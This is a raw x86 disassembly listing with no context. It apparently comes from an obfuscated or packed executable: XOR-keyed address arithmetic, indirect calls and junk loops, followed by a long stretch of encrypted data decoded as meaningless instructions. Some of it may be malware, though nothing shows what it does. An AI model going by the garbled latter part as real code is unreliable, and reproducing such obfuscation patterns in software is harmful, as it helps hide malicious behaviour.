  41bd7a:	mov    ebx,DWORD PTR [ebp-0x4]
  41bd7d:	mov    ecx,DWORD PTR [ebp-0x8]
  41bd80:	mov    edx,DWORD PTR [ebp-0x8]
  41bd83:	xor    edx,esi
  41bd85:	xor    ecx,esi
  41bd87:	add    ecx,edx
  41bd89:	mov    edx,DWORD PTR [ebp-0x8]
  41bd8c:	xor    ebx,esi
  41bd8e:	xor    edx,esi
  41bd90:	add    ebx,edi
  41bd92:	lea    ecx,[ecx+edx*1+0x975891]
  41bd99:	cmp    ebx,ecx
  41bd9b:	ja     0x41bdfc
  41bda1:	mov    eax,DWORD PTR [ebp-0x8]
  41bda4:	xor    eax,esi
  41bda6:	lea    eax,[eax+ebx*1+0x3272db]
  41bdad:	push   eax
  41bdae:	mov    eax,DWORD PTR [ebp-0x1c]
  41bdb1:	xor    eax,esi
  41bdb3:	lea    eax,[ebp+eax*1+0x3272e3]
  41bdba:	push   eax
  41bdbb:	mov    eax,ds:0x423f7f
  41bdc0:	push   DWORD PTR [eax+0x1bc]
  41bdc6:	call   0x40843e
  41bdcb:	mov    eax,DWORD PTR [ebp-0x8]
  41bdce:	xor    eax,esi
  41bdd0:	lea    ebx,[ebx+eax*1+0x3272db]
  41bdd7:	mov    eax,DWORD PTR [ebp-0x8]
  41bdda:	mov    ecx,DWORD PTR [ebp-0x8]
  41bddd:	xor    ecx,esi
  41bddf:	xor    eax,esi
  41bde1:	add    eax,ecx
  41bde3:	mov    ecx,DWORD PTR [ebp-0x8]
  41bde6:	xor    ecx,esi
  41bde8:	lea    eax,[eax+ecx*1+0x975891]
  41bdef:	cmp    ebx,eax
  41bdf1:	jbe    0x41bda1
  41bdf7:	mov    eax,0xf89c85ba
  41bdfc:	mov    ecx,DWORD PTR [ebp+0xc]
  41bdff:	mov    DWORD PTR ds:0x423e03,ecx
  41be05:	mov    ecx,DWORD PTR [ebp+0x10]
  41be08:	mov    DWORD PTR ds:0x424057,ecx
  41be0e:	mov    ecx,DWORD PTR ds:0x423e03
  41be14:	mov    edx,DWORD PTR [ebp-0x20]
  41be17:	sub    ecx,edi
  41be19:	xor    ecx,esi
  41be1b:	mov    DWORD PTR [edx],ecx
  41be1d:	mov    edx,DWORD PTR [ebp-0xc]
  41be20:	mov    ecx,0xf89c85b6
  41be25:	cmp    edx,ecx
  41be27:	jne    0x41be52
  41be2d:	lea    eax,[ebp-0x14]
  41be30:	mov    DWORD PTR [ebp-0x24],eax
  41be33:	lea    eax,[ebp+0x4]
  41be36:	mov    DWORD PTR [ebp-0x14],eax
  41be39:	mov    eax,DWORD PTR [ebp-0x14]
  41be3c:	test   eax,eax
  41be3e:	je     0x41bf67
  41be44:	mov    eax,DWORD PTR [ebp-0x10]
  41be47:	mov    eax,DWORD PTR [ebp-0x8]
  41be4a:	lea    eax,[ebp-0x24]
  41be4d:	jmp    0x41bf5e
  41be52:	mov    edx,DWORD PTR [ebp-0x28]
  41be55:	cmp    edx,0xf89c85b5
  41be5b:	je     0x41beb8
  41be61:	mov    edx,DWORD PTR [ebp-0x4]
  41be64:	mov    ebx,DWORD PTR [ebp-0x2c]
  41be67:	xor    edx,esi
  41be69:	add    edx,edi
  41be6b:	cmp    edx,ebx
  41be6d:	je     0x41beb8
  41be73:	mov    eax,ds:0x423f7f
  41be78:	mov    eax,DWORD PTR [eax+0x194]
  41be7e:	mov    ecx,DWORD PTR [eax]
  41be80:	mov    eax,DWORD PTR [ecx+0x3c]
  41be83:	push   DWORD PTR ds:0x424057
  41be89:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41be8d:	push   DWORD PTR ds:0x423e03
  41be93:	add    eax,ecx
  41be95:	mov    ecx,DWORD PTR ds:0x423f7f
  41be9b:	mov    ecx,DWORD PTR [ecx+0x194]
  41bea1:	push   DWORD PTR [ecx]
  41bea3:	call   eax
  41bea5:	mov    ecx,DWORD PTR ds:0x423f7f
  41beab:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41beb1:	mov    DWORD PTR [ecx],eax
  41beb3:	jmp    0x41bf67
  41beb8:	mov    edx,DWORD PTR [ebp-0x4]
  41bebb:	mov    ebx,DWORD PTR [ebp-0x30]
  41bebe:	xor    edx,esi
  41bec0:	add    edx,edi
  41bec2:	cmp    edx,ebx
  41bec4:	jne    0x41bf1d
  41beca:	mov    edx,DWORD PTR [ebp-0x4]
  41becd:	mov    ebx,DWORD PTR ds:0x423f7f
  41bed3:	mov    ebx,DWORD PTR [ebx+0x198]
  41bed9:	xor    edx,esi
  41bedb:	add    edx,edi
  41bedd:	cmp    edx,DWORD PTR [ebx]
  41bedf:	jne    0x41befa
  41bee5:	push   ecx
  41bee6:	mov    ecx,DWORD PTR [ebp-0x4]
  41bee9:	xor    ecx,esi
  41beeb:	add    ecx,edi
  41beed:	push   ecx
  41beee:	push   eax
  41beef:	push   DWORD PTR [ebp-0x8]
  41bef2:	push   DWORD PTR [ebp-0x4]
  41bef5:	call   0x416ab7
  41befa:	push   DWORD PTR [ebp-0x8]
  41befd:	push   DWORD PTR [ebp-0x4]
  41bf00:	call   0x41bf89
  41bf05:	mov    eax,DWORD PTR [ebp-0x4]
  41bf08:	xor    eax,esi
  41bf0a:	add    eax,edi
  41bf0c:	mov    ds:0x424003,eax
  41bf11:	mov    eax,DWORD PTR [ebp-0x4]
  41bf14:	xor    eax,esi
  41bf16:	add    eax,edi
  41bf18:	mov    ds:0x423ffb,eax
  41bf1d:	lea    eax,[ebp-0x18]
  41bf20:	mov    DWORD PTR [ebp-0x34],eax
  41bf23:	lea    eax,[ebp+0x4]
  41bf26:	mov    DWORD PTR [ebp-0x18],eax
  41bf29:	mov    eax,DWORD PTR [ebp-0x18]
  41bf2c:	test   eax,eax
  41bf2e:	je     0x41bf67
  41bf34:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  41bf3b:	mov    DWORD PTR [ebp-0x40],0x712ed08
  41bf42:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  41bf49:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  41bf50:	call   0x411f4d
  41bf55:	mov    eax,DWORD PTR [ebp-0x10]
  41bf58:	mov    eax,DWORD PTR [ebp-0x8]
  41bf5b:	lea    eax,[ebp-0x34]
  41bf5e:	push   eax
  41bf5f:	push   DWORD PTR [ebp-0x4]
  41bf62:	call   0x40f9a6
  41bf67:	mov    eax,ds:0x423f7f
  41bf6c:	push   0x4
  41bf6e:	add    eax,0x1cc
  41bf73:	push   eax
  41bf74:	lea    eax,[ebp-0x10]
  41bf77:	push   eax
  41bf78:	call   0x40843e
  41bf7d:	mov    eax,DWORD PTR [ebp-0x10]
  41bf80:	mov    eax,DWORD PTR [eax]
  41bf82:	pop    edi
  41bf83:	pop    esi
  41bf84:	pop    ebx
  41bf85:	leave  
  41bf86:	ret    0xc
  41bf89:	push   ebp
  41bf8a:	mov    ebp,esp
  41bf8c:	sub    esp,0x98
  41bf92:	mov    eax,DWORD PTR [ebp+0x8]
  41bf95:	inc    ecx
  41bf96:	push   ebx
  41bf97:	sbb    DWORD PTR ds:0x42a014,edx
  41bf9d:	push   esi
  41bf9e:	add    esi,esi
  41bfa0:	push   edi
  41bfa1:	and    DWORD PTR ds:0x42c014,0x0
  41bfab:	jmp    0x41bfbd
  41bfb0:	mov    edi,DWORD PTR ds:0x42c014
  41bfb6:	inc    edi
  41bfb7:	mov    DWORD PTR ds:0x42c014,edi
  41bfbd:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bfc4:	jae    0x41c01b
  41bfca:	cmp    DWORD PTR ds:0x42c014,0xb
  41bfd1:	jne    0x41bfea
  41bfd7:	push   0x4244d9
  41bfdc:	push   0x42446b
  41bfe1:	push   DWORD PTR [ebp-0x1c]
  41bfe4:	call   DWORD PTR ds:0x42503c
  41bfea:	cmp    DWORD PTR ds:0x42c014,0xa
  41bff1:	jne    0x41c004
  41bff7:	mov    edi,DWORD PTR ds:0x42c014
  41bffd:	inc    edi
  41bffe:	mov    DWORD PTR ds:0x42c014,edi
  41c004:	jmp    0x41bfb0
  41c009:	mov    esi,DWORD PTR ds:0x42c000
  41c00f:	or     esi,DWORD PTR ds:0x42a000
  41c015:	mov    DWORD PTR ds:0x42c000,esi
  41c01b:	mov    esi,0x7510893
  41c020:	xor    eax,esi
  41c022:	mov    edi,DWORD PTR ds:0x423daf
  41c028:	mov    ecx,DWORD PTR ds:0x423dcb
  41c02e:	sub    edi,ecx
  41c030:	sub    edi,DWORD PTR [edi+ecx*1]
  41c033:	mov    edi,0x3272db
  41c038:	add    eax,edi
  41c03a:	xor    ecx,0x38ef
  41c040:	mov    DWORD PTR [ebp-0x30],eax
  41c043:	mov    eax,ds:0x423dff
  41c048:	mov    DWORD PTR ds:0x429010,0x1f
  41c052:	cmp    DWORD PTR ds:0x429010,0x0
  41c059:	je     0x41c0ad
  41c05f:	cmp    DWORD PTR ds:0x429010,0xf
  41c066:	jne    0x41c081
  41c06c:	push   0x82e0
  41c071:	push   0x7826
  41c076:	push   0x30a6
  41c07b:	call   DWORD PTR ds:0x425040
  41c081:	cmp    DWORD PTR ds:0x429010,0x10
  41c088:	jne    0x41c09b
  41c08e:	mov    ecx,DWORD PTR ds:0x429010
  41c094:	dec    ecx
  41c095:	mov    DWORD PTR ds:0x429010,ecx
  41c09b:	mov    ecx,DWORD PTR ds:0x429010
  41c0a1:	dec    ecx
  41c0a2:	mov    DWORD PTR ds:0x429010,ecx
  41c0a8:	jmp    0x41c052
  41c0ad:	mov    eax,DWORD PTR [eax]
  41c0af:	add    ecx,DWORD PTR ds:0x42a01c
  41c0b5:	jmp    0x41e403
  41c0ba:	icebp  
  41c0bb:	push   ecx
  41c0bc:	inc    edi
  41c0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0bf:	mov    ds:0x413825ab,eax
  41c0c4:	aaa    
  41c0c5:	and    al,0x78
  41c0c7:	inc    edi
  41c0c8:	add    esp,DWORD PTR [edi+0x24]
  41c0cb:	std    
  41c0cc:	popa   
  41c0cd:	bound  edx,QWORD PTR [ecx+0x5f]
  41c0d0:	bound  esp,QWORD PTR [edx+0x28]
  41c0d3:	aad    0x0
  41c0d5:	cmp    eax,0xd83c0cbc
  41c0da:	repnz sub bl,bl
  41c0dd:	add    BYTE PTR [eax+0x50ee0596],al
  41c0e3:	mov    ebx,fs
  41c0e5:	loope  0x41c0b9
  41c0e7:	fcomp  QWORD PTR [esi]
  41c0e9:	mov    al,0x16
  41c0eb:	test   dh,dh
  41c0ed:	scas   eax,DWORD PTR es:[di]
  41c0ef:	xor    BYTE PTR [eax-0x785c8419],dh
  41c0f5:	jae    0x41c112
  41c0f7:	test   ch,cl
  41c0f9:	and    dl,BYTE PTR [ecx]
  41c0fb:	xor    bh,BYTE PTR ds:0x4b5becb9
  41c101:	test   BYTE PTR [esi*4-0xf6a08a],dh
  41c108:	add    ebx,eax
  41c10a:	pop    edi
  41c10b:	fnstsw WORD PTR [ebp+0x3c]
  41c10e:	cld    
  41c10f:	xchg   ecx,eax
  41c110:	lahf   
  41c111:	sbb    al,0x64
  41c113:	pop    es
  41c114:	mov    dl,0x9e
  41c116:	xchg   esp,eax
  41c117:	adc    bh,dl
  41c119:	jnp    0x41c0e7
  41c11b:	int3   
  41c11c:	in     al,0x9e
  41c11e:	lods   eax,DWORD PTR ds:[esi]
  41c11f:	loopne 0x41c0d4
  41c121:	xchg   DWORD PTR [eax+esi*8],ecx
  41c124:	in     al,dx
  41c125:	push   ecx
  41c126:	mov    esp,0x6447ae2a
  41c12b:	out    dx,eax
  41c12c:	int3   
  41c12d:	(bad)  
  41c12e:	sub    eax,0xfc2f4bd
  41c133:	pop    ecx
  41c134:	jns    0x41c181
  41c136:	popf   
  41c137:	test   DWORD PTR [ebp-0x6ffed064],esp
  41c13d:	out    0xa,eax
  41c13f:	(bad)  
  41c140:	jmp    0x41c0c7
  41c142:	ins    DWORD PTR es:[edi],dx
  41c143:	jmp    FWORD PTR [ecx+esi*2+0x6c]
  41c147:	jmp    0x3be28a72
  41c14c:	bound  edx,QWORD PTR fs:[edx+ecx*2-0x70fcc455]
  41c154:	(bad)  
  41c155:	retf   0xeeb
  41c158:	jns    0x41c136
  41c15a:	mov    gs,WORD PTR [ecx+esi*2-0x10]
  41c15e:	jnp    0x41c1ba
  41c160:	clc    
  41c161:	repnz gs cmp eax,0xb542dcdf
  41c168:	mov    DWORD PTR [ebx],edi
  41c16a:	jmp    0x2fe88557
  41c16f:	stos   DWORD PTR es:[edi],eax
  41c170:	dec    esp
  41c171:	imul   edx,DWORD PTR [edx],0x34
  41c174:	dec    eax
  41c175:	sbb    bh,BYTE PTR [esi-0x7b]
  41c178:	mov    ecx,DWORD PTR [ebx-0xc]
  41c17b:	pop    esi
  41c17c:	lods   al,BYTE PTR ds:[esi]
  41c17d:	lock sub BYTE PTR [ebx+0x3d],0x72
  41c182:	mov    al,0x1f
  41c184:	cld    
  41c185:	add    esp,DWORD PTR [edx-0x19]
  41c188:	icebp  
  41c189:	mov    edx,0xf55a7644
  41c18e:	jbe    0x41c15f
  41c190:	ret    
  41c191:	mov    bh,0x64
  41c193:	dec    ebx
  41c194:	or     ah,BYTE PTR [esi]
  41c196:	pop    ecx
  41c197:	in     al,dx
  41c198:	out    0xe,eax
  41c19a:	rcl    BYTE PTR [ecx+0x76],0x96
  41c19e:	pop    eax
  41c19f:	into   
  41c1a0:	inc    ebp
  41c1a1:	int    0x3f
  41c1a3:	jno    0x41c139
  41c1a5:	xor    cl,BYTE PTR [ecx-0x4e]
  41c1a8:	pop    ebx
  41c1a9:	out    0xbe,eax
  41c1ab:	jp     0x41c172
  41c1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ae:	int3   
  41c1af:	xor    BYTE PTR [ebp+0x68],0xa5
  41c1b3:	rol    BYTE PTR [ebx-0x79],1
  41c1b6:	gs sub al,0x1b
  41c1b9:	sub    BYTE PTR [eax],bl
  41c1bb:	sub    eax,0x9a18babe
  41c1c0:	fwait
  41c1c1:	inc    esi
  41c1c2:	mov    ch,ah
  41c1c4:	jbe    0x41c223
  41c1c6:	pushf  
  41c1c7:	addr16 (bad) 
  41c1c9:	jno    0x41c1ea
  41c1cb:	in     al,0x47
  41c1cd:	add    BYTE PTR [ebx],dl
  41c1cf:	pop    ecx
  41c1d0:	mov    DWORD PTR [ecx-0x22],esp
  41c1d3:	push   ebp
  41c1d4:	jecxz  0x41c1d5
  41c1d6:	dec    edi
  41c1d7:	cwde   
  41c1d8:	push   0x25
  41c1da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1db:	adc    eax,0xa45d3f3c
  41c1e0:	pop    es
  41c1e1:	test   eax,0xd3ab36d8
  41c1e6:	(bad)  
  41c1e7:	mov    eax,0x160c62b2
  41c1ec:	mov    bl,0x18
  41c1ee:	std    
  41c1ef:	and    bl,BYTE PTR [edx]
  41c1f1:	rep lods eax,DWORD PTR ds:[esi]
  41c1f3:	loop   0x41c21c
  41c1f5:	retf   0x9da4
  41c1f8:	jle    0x41c1ba
  41c1fa:	push   cs
  41c1fb:	(bad)  
  41c1fd:	loopne 0x41c21b
  41c1ff:	sar    BYTE PTR [edx+0x36b4ee6d],1
  41c205:	mov    esp,eax
  41c207:	sbb    eax,0x2422dbdb
  41c20c:	fcmovnu st,st(7)
  41c20e:	int3   
  41c20f:	js     0x41c1a7
  41c211:	jno    0x41c232
  41c213:	test   BYTE PTR [ebx+0x1b],al
  41c216:	out    0x3c,al
  41c218:	in     eax,dx
  41c219:	xchg   esp,eax
  41c21a:	ret    0x3678
  41c21d:	xlat   BYTE PTR ds:[ebx]
  41c21e:	rol    bh,0xa0
  41c221:	cmp    ecx,eax
  41c223:	xlat   BYTE PTR ds:[ebx]
  41c224:	xchg   ecx,eax
  41c225:	clc    
  41c226:	xor    esi,DWORD PTR [edi-0x274efbe]
  41c22c:	cmp    DWORD PTR [eax],ecx
  41c22e:	sbb    eax,0x7fab9b68
  41c233:	xchg   edx,eax
  41c234:	cmp    ebp,ecx
  41c236:	xor    ebx,DWORD PTR [ecx]
  41c238:	aam    0x70
  41c23a:	daa    
  41c23b:	shl    edx,cl
  41c23d:	dec    esp
  41c23e:	dec    edi
  41c23f:	ficom  DWORD PTR [edi+0x9654b63]
  41c245:	jb     0x41c21d
  41c247:	add    al,0xbf
  41c249:	adc    eax,0xed4a1e33
  41c24e:	adc    cl,BYTE PTR [ebx]
  41c250:	mov    esi,0xe19ebbce
  41c255:	adc    al,0x52
  41c257:	inc    eax
  41c258:	sub    BYTE PTR [esp+edi*8+0x4561efad],bh
  41c25f:	outs   dx,BYTE PTR ds:[esi]
  41c260:	adc    eax,0x7f0e3804
  41c265:	mov    ebx,ecx
  41c267:	fadd   DWORD PTR [ecx]
  41c269:	mov    esp,0xb4a244f
  41c26e:	add    eax,0xedadec06
  41c273:	out    dx,eax
  41c274:	stc    
  41c275:	inc    ebp
  41c276:	mov    dh,0x4f
  41c278:	xlat   BYTE PTR ds:[ebx]
  41c279:	push   ss
  41c27a:	(bad)  
  41c27b:	pop    esi
  41c27c:	cmc    
  41c27d:	jns    0x41c237
  41c27f:	inc    ebx
  41c280:	xor    al,0x99
  41c282:	xor    eax,0x5fde918c
  41c287:	jae    0x41c236
  41c289:	sub    al,0xc1
  41c28b:	xchg   esi,eax
  41c28c:	push   esi
  41c28d:	xor    edi,DWORD PTR [ebx]
  41c28f:	jne    0x41c2f3
  41c291:	popa   
  41c292:	mov    fs,WORD PTR [edi]
  41c294:	pop    edx
  41c295:	add    dl,BYTE PTR [esi]
  41c297:	and    BYTE PTR [edx],cl
  41c299:	sbb    ah,BYTE PTR [ebx+0x3c]
  41c29c:	xor    dl,BYTE PTR [edx]
  41c29e:	daa    
  41c29f:	jo     0x41c2a6
  41c2a1:	sar    BYTE PTR [ecx+0xd],1
  41c2a4:	jns    0x41c244
  41c2a6:	gs int 0xe0
  41c2a9:	fs fsubp st(5),st
  41c2ac:	mov    ebx,0x407c0da1
  41c2b1:	leave  
  41c2b2:	add    edi,ecx
  41c2b4:	xchg   edi,eax
  41c2b5:	retf   0xe3fc
  41c2b8:	mov    edx,0x48706d05
  41c2bd:	lods   al,BYTE PTR ds:[esi]
  41c2be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2bf:	aad    0x8e
  41c2c1:	icebp  
  41c2c2:	xlat   BYTE PTR ds:[ebx]
  41c2c3:	fldenvw [edx+0x3d635dfd]
  41c2ca:	jge    0x41c2bc
  41c2cc:	sub    DWORD PTR ds:0x89b71c2d,ecx
  41c2d2:	sahf   
  41c2d3:	mov    ds:0xe628913e,al
  41c2d8:	and    eax,0xa9624202
  41c2dd:	sbb    BYTE PTR [ebx],al
  41c2df:	retf   0x6b04
  41c2e2:	jecxz  0x41c324
  41c2e4:	daa    
  41c2e5:	dec    esi
  41c2e6:	mov    eax,ds:0x6f33dee3
  41c2eb:	sbb    eax,0x20159dd3
  41c2f0:	test   al,0x74
  41c2f2:	scas   al,BYTE PTR es:[edi]
  41c2f3:	sbb    BYTE PTR [bx-0xf],al
  41c2f7:	jmp    0x3de313fe
  41c2fc:	sar    BYTE PTR [eax-0x6f],1
  41c2ff:	push   es
  41c300:	xchg   edi,eax
  41c301:	dec    ebp
  41c302:	arpl   WORD PTR [edx],ax
  41c304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c305:	mov    dl,0xaa
  41c307:	js     0x41c2b7
  41c309:	test   BYTE PTR [ebx],0xaa
  41c30c:	(bad)  
  41c30e:	imul   ebp,DWORD PTR [esi-0x34],0xffffffc1
  41c312:	retf   
  41c313:	jmp    0x9da1:0x872acd30
  41c31a:	repnz xchg ebp,eax
  41c31c:	(bad)  
  41c31d:	stc    
  41c31e:	sahf   
  41c31f:	fwait
  41c320:	inc    edx
  41c321:	lahf   
  41c322:	jge    0x41c356
  41c324:	xlat   BYTE PTR ds:[ebx]
  41c325:	jg     0x41c353
  41c327:	call   0xbfb8a59f
  41c32c:	jno    0x41c380
  41c32e:	cmp    al,0x23
  41c330:	data16 into 
  41c332:	out    dx,al
  41c333:	lods   al,BYTE PTR ds:[esi]
  41c334:	cs xchg edi,eax
  41c336:	outs   dx,BYTE PTR ds:[esi]
  41c337:	jo     0x41c345
  41c339:	or     DWORD PTR [edx-0x3c410692],0xffffff8e
  41c340:	xor    DWORD PTR [esi+0x65],edx
  41c343:	add    al,0x8b
  41c345:	dec    eax
  41c346:	pop    ss
  41c347:	cmp    DWORD PTR [edi+0x4d3634e2],edx
  41c34d:	push   esp
  41c34e:	mov    ebp,0xdf413624
  41c353:	dec    edx
  41c354:	fnstcw WORD PTR [ecx]
  41c356:	push   ds
  41c357:	and    eax,0x84d52a75
  41c35c:	imul   edx,DWORD PTR [edx-0x529b39d2],0xfffffff8
  41c363:	jge    0x41c377
  41c365:	aas    
  41c366:	add    esp,ebp
  41c368:	out    dx,al
  41c369:	add    ch,BYTE PTR [ebp-0x38]
  41c36c:	iret   
  41c36d:	mul    BYTE PTR [eax]
  41c36f:	cmp    esp,ecx
  41c371:	ret    0xf0d5
  41c374:	fwait
  41c375:	xchg   edi,eax
  41c376:	xchg   DWORD PTR [edi],esi
  41c378:	cmc    
  41c379:	nop
  41c37a:	mov    esi,0x37ea3253
  41c37f:	and    eax,esp
  41c381:	das    
  41c382:	adc    BYTE PTR [esi-0xa],ch
  41c385:	cli    
  41c386:	mov    esp,fs
  41c388:	lods   eax,DWORD PTR ds:[esi]
  41c389:	adc    eax,DWORD PTR [ebp-0x1e]
  41c38c:	sub    bl,BYTE PTR [eax]
  41c38e:	(bad)
  41c392:	das    
  41c393:	jae    0x41c400
  41c395:	in     al,0x41
  41c397:	test   eax,0x5bad61ed
  41c39c:	push   ecx
  41c39d:	pop    ebp
  41c39e:	jg     0x41c389
  41c3a0:	icebp  
  41c3a1:	outs   dx,DWORD PTR ds:[esi]
  41c3a2:	push   edi
  41c3a3:	in     eax,0x4a
  41c3a5:	imul   esp,DWORD PTR [edx-0x55],0xe05245a6
  41c3ac:	mov    dl,0x9d
  41c3ae:	fidivr DWORD PTR [ebp-0x49]
  41c3b1:	mov    bl,0x91
  41c3b3:	xchg   ebx,eax
  41c3b4:	and    BYTE PTR [esi],0x6f
  41c3b7:	jecxz  0x41c38f
  41c3b9:	clc    
  41c3ba:	les    edx,FWORD PTR [eax+0x36f5cf0d]
  41c3c0:	xlat   BYTE PTR ds:[ebx]
  41c3c1:	cmp    ax,0x881b
  41c3c5:	or     esp,edi
  41c3c7:	int    0x44
  41c3c9:	inc    edi
  41c3ca:	stc    
  41c3cb:	cwde   
  41c3cc:	pop    ds
  41c3cd:	shl    DWORD PTR [ecx-0x1e],0xd7
  41c3d1:	mov    esi,0xd6ae678e
  41c3d6:	les    esi,FWORD PTR [esi-0x39d52ee2]
  41c3dc:	mov    ecx,0x56eed856
  41c3e1:	out    dx,eax
  41c3e2:	dec    edi
  41c3e3:	test   DWORD PTR [ebp+0x391621df],esp
  41c3e9:	dec    eax
  41c3ea:	jp     0x41c42a
  41c3ec:	push   eax
  41c3ed:	fnsave [edi+0x44]
  41c3f0:	jne    0x41c39c
  41c3f2:	push   esi
  41c3f3:	not    DWORD PTR [eax+ebx*8-0x51010541]
  41c3fa:	out    0xe,al
  41c3fc:	pop    edi
  41c3fd:	in     al,dx
  41c3fe:	dec    esi
  41c3ff:	push   cs
  41c400:	mov    ?,edi
  41c402:	push   0x7c39a0f5
  41c407:	xchg   esi,eax
  41c408:	inc    esp
  41c409:	fisttp WORD PTR [ebx-0x2d0f7a7f]
  41c40f:	push   ebx
  41c410:	sbb    ebx,DWORD PTR [edx+edx*2+0x48b60228]
  41c417:	inc    edx
  41c418:	cld    
  41c419:	iret   
  41c41a:	rcr    BYTE PTR [ebx+esi*1+0x60],cl
  41c41e:	mov    ds:0x8ba5d3b9,al
  41c423:	xchg   ebp,eax
  41c424:	ret    
  41c425:	xor    esi,DWORD PTR [ebx-0x28]
  41c428:	mov    al,0x82
  41c42a:	push   0x5
  41c42c:	mov    dl,0xb6
  41c42e:	push   ebx
  41c42f:	add    BYTE PTR [esi+edi*1-0x66],bl
  41c433:	push   eax
  41c434:	mov    ss,WORD PTR [esi]
  41c436:	mov    ds:0x7da71a9e,eax
  41c43b:	add    DWORD PTR [edi+0x5a502e61],0x64
  41c442:	pop    ecx
  41c443:	add    DWORD PTR [esi],ebp
  41c445:	xor    al,0x59
  41c447:	clc    
  41c448:	and    al,0x23
  41c44a:	mov    cl,0x27
  41c44c:	push   ds
  41c44d:	test   eax,0x7d081375
  41c452:	mov    ?,WORD PTR [eax-0x14]
  41c455:	adc    ch,BYTE PTR [esi+0x48]
  41c458:	cmp    cl,BYTE PTR [eax-0x2b]
  41c45b:	jmp    0xda24:0x83061d1f
  41c462:	test   eax,0x60eee8df
  41c467:	stos   BYTE PTR es:[edi],al
  41c468:	mov    eax,0xf6da9927
  41c46d:	jp     0x41c4a7
  41c46f:	sub    eax,0xdd7f7276
  41c474:	dec    ebx
  41c475:	pop    ds
  41c476:	or     dl,BYTE PTR [edi+ecx*4]
  41c479:	jg     0x41c410
  41c47b:	jp     0x41c4a3
  41c47d:	loop   0x41c42d
  41c47f:	ds and eax,0x6b601de3
  41c485:	jmp    0x415ac7ed
  41c48a:	icebp  
  41c48b:	cmp    ah,BYTE PTR ds:0xb07562ff
  41c491:	jno    0x41c48d
  41c493:	mov    ebp,0xa4ab0c5f
  41c498:	jns    0x41c43b
  41c49a:	jno    0x41c518
  41c49c:	fs inc eax
  41c49e:	nop
  41c49f:	inc    eax
  41c4a0:	cmp    esp,ebp
  41c4a2:	xchg   ebx,edx
  41c4a4:	dec    edx
  41c4a5:	cmp    ch,dh
  41c4a7:	and    ecx,DWORD PTR [ebx+0x2b]
  41c4aa:	mov    edx,0x4f31b8ce
  41c4af:	mov    edi,0x6f07e973
  41c4b4:	xor    eax,0xa980526b
  41c4b9:	push   edx
  41c4ba:	cmp    bl,ah
  41c4bc:	xchg   BYTE PTR [ebx],al
  41c4be:	or     ah,ch
  41c4c0:	xchg   ebp,eax
  41c4c1:	out    0xe5,al
  41c4c3:	mov    edi,0x775adf1d
  41c4c8:	lods   eax,DWORD PTR ds:[esi]
  41c4c9:	add    eax,0x1e21aad7
  41c4ce:	not    BYTE PTR [edx+0x5c5b9942]
  41c4d4:	gs out dx,al
  41c4d6:	mov    edx,0xcff6f957
  41c4db:	mov    dl,BYTE PTR [edi+0x3ce069a9]
  41c4e1:	imul   ebx,DWORD PTR [esi],0x7b
  41c4e4:	cmovge ecx,DWORD PTR [edx]
  41c4e7:	inc    ebp
  41c4e8:	or     ch,BYTE PTR [esi+0x329979bf]
  41c4ee:	xor    BYTE PTR [ebx-0x64],bl
  41c4f1:	addr16 icebp 
  41c4f3:	fcmovnbe st,st(6)
  41c4f5:	mov    al,0xdb
  41c4f7:	in     al,0x52
  41c4f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4fa:	push   0x605f5197
  41c4ff:	ret    0x3b99
  41c502:	push   ebp
  41c503:	(bad)  
  41c504:	out    0xc3,eax
  41c506:	adc    DWORD PTR [esi+0x18632293],edx
  41c50c:	xchg   ecx,eax
  41c50d:	mov    eax,0x27d1f1fc
  41c512:	xchg   ebp,eax
  41c513:	cmp    ch,BYTE PTR [edx+0x21853570]
  41c519:	fadd   st(7),st
  41c51b:	mov    dh,0xfd
  41c51d:	ss daa 
  41c51f:	xchg   esp,eax
  41c520:	fisub  WORD PTR [ecx+0x268059f]
  41c526:	(bad)  
  41c527:	jb     0x41c5a4
  41c529:	xchg   edx,eax
  41c52a:	jo     0x41c4fb
  41c52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c52d:	mov    ecx,0xc6c49738
  41c532:	sub    ah,BYTE PTR [edi]
  41c534:	xchg   DWORD PTR [eax],eax
  41c536:	push   ss
  41c537:	jg     0x41c520
  41c539:	and    eax,0xac0787c
  41c53e:	mov    esi,0xd4f5c56e
  41c543:	jbe    0x41c58e
  41c545:	mov    eax,ds:0x5ef32f3e
  41c54a:	fwait
  41c54b:	adc    BYTE PTR [esi],al
  41c54d:	push   esi
  41c54e:	adc    al,0x50
  41c550:	lods   eax,DWORD PTR ds:[esi]
  41c551:	jl     0x41c5c0
  41c553:	in     al,0xac
  41c555:	imul   DWORD PTR [ebx+ecx*4]
  41c558:	dec    edi
  41c559:	dec    eax
  41c55a:	sub    DWORD PTR [edx-0x59],esp
  41c55d:	ret    
  41c55e:	call   0xa5d2c3bd
  41c563:	mov    WORD PTR [ecx+0x26],fs
  41c566:	retf   
  41c567:	xchg   edi,eax
  41c568:	sub    BYTE PTR [esi+0x5ca9e8d0],bh
  41c56e:	clc    
  41c56f:	les    esi,FWORD PTR [ebx+0x7a]
  41c572:	pop    edx
  41c573:	ret    
  41c574:	jmp    0x22da4612
  41c579:	add    BYTE PTR [ebx-0x51690682],cl
  41c57f:	inc    eax
  41c580:	fistp  DWORD PTR [ebp-0x619dafd]
  41c586:	mov    edi,es
  41c588:	es push 0x49997a15
  41c58e:	stc    
  41c58f:	push   esp
  41c590:	test   BYTE PTR [esi-0x11be6fd5],bl
  41c596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c597:	loopne 0x41c519
  41c599:	iret   
  41c59a:	jl     0x41c577
  41c59c:	lods   al,BYTE PTR ds:[esi]
  41c59d:	loope  0x41c5f2
  41c59f:	jmp    0x41c5d1
  41c5a1:	and    al,0x22
  41c5a3:	or     dl,BYTE PTR [edx+eax*4]
